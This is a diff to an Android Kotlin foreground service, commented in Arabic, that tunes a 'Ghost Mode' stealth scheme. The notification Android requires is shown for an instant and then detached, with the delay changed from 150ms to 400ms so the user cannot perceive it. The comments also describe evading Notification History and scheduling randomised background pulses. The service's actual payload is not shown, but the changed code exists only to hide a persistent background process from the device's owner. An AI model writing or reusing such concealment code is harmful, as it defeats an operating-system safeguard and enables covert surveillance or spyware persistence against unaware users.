@@ -18,7 +18,7 @@ import kotlin.random.Random
  * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" غير مرئي.
  *
  * استراتيجية التخفي المتقدمة (Ghost Mode v3):
- * - الإشعار الأساسي (عند بدء الخدمة) يظهر لفترة قصيرة جداً (150ms) ثم يُفصل عن الخدمة.
+ * - الإشعار الأساسي (عند بدء الخدمة) يظهر لفترة قصيرة جداً (400ms) ثم يُفصل عن الخدمة.
  * - لا يتم استخدام NotificationManager.cancel() مطلقاً لتجنب الانهيار في Android 12+.
  * - يتم فصل الإشعار عن الخدمة باستخدام STOP_FOREGROUND_DETACH عند الحاجة.
  * - جدولة نبضات عشوائية متباعدة (15-35 دقيقة) مع إعادة جدولة ديناميكية بعد كل نبضة.
@@ -31,7 +31,7 @@ import kotlin.random.Random
  * ✅ تم إضافة عشوائية متغيرة في الجدولة (15-35 دقيقة).
  * ✅ تم إزالة setOngoing(true) لمنع تسجيل الإشعار في Notification History.
  * ✅ تم إضافة setAutoCancel(true) لضمان عدم بقاء الإشعار (للنبضات العابرة).
- * ✅ تم إخفاء الإشعار الأساسي فوراً بعد 150ms مع إبقاء الخدمة حية.
+ * ✅ تم إخفاء الإشعار الأساسي فوراً بعد 400ms مع إبقاء الخدمة حية.
  */
 class ForegroundService : Service() {
 
@@ -70,7 +70,7 @@ class ForegroundService : Service() {
             return START_STICKY
         }
 
-        // ✅ بدء الخدمة مع إشعار شبحى يختفي فوراً بعد 150ms
+        // ✅ بدء الخدمة مع إشعار شبحى يختفي فوراً بعد 400ms
         if (!isForeground) {
             startGhostForeground()
         }
@@ -86,7 +86,7 @@ class ForegroundService : Service() {
     /**
      * ✅ بدء الخدمة كـ Foreground مع إشعار شبحى يختفي فوراً.
      * يستخدم قناة بأدنى أولوية (IMPORTANCE_MIN) ومحتوى فارغ،
-     * ثم يفصل الإشعار عن الخدمة بعد 150 مللي ثانية باستخدام STOP_FOREGROUND_DETACH.
+     * ثم يفصل الإشعار عن الخدمة بعد 400 مللي ثانية باستخدام STOP_FOREGROUND_DETACH.
      * لا يتم استخدام NotificationManager.cancel() مطلقاً لتجنب الانهيار.
      */
     private fun startGhostForeground() {
@@ -124,7 +124,8 @@ class ForegroundService : Service() {
         // ✅ إلغاء أي إخفاء مجدول سابق
         hideRunnable?.let { pulseHandler.removeCallbacks(it) }
 
-        // ✅ إخفاء الإشعار فوراً بعد 150 مللي ثانية مع إبقاء الخدمة حية
+        // ✅ إخفاء الإشعار فوراً بعد 400 مللي ثانية مع إبقاء الخدمة حية
+        // 400ms كافية لتجنب قتل الخدمة في Android 12+ مع بقاء الإشعار غير محسوس بشرياً
         hideRunnable = Runnable {
             if (isForeground) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -137,7 +138,7 @@ class ForegroundService : Service() {
                 isForeground = false
             }
         }
-        pulseHandler.postDelayed(hideRunnable!!, 150L) // زيادة إلى 150ms لضمان الاختفاء
+        pulseHandler.postDelayed(hideRunnable!!, 400L) // ✅ التصحيح الأساسي: 400ms بدلاً من 150ms
     }
 
     /**
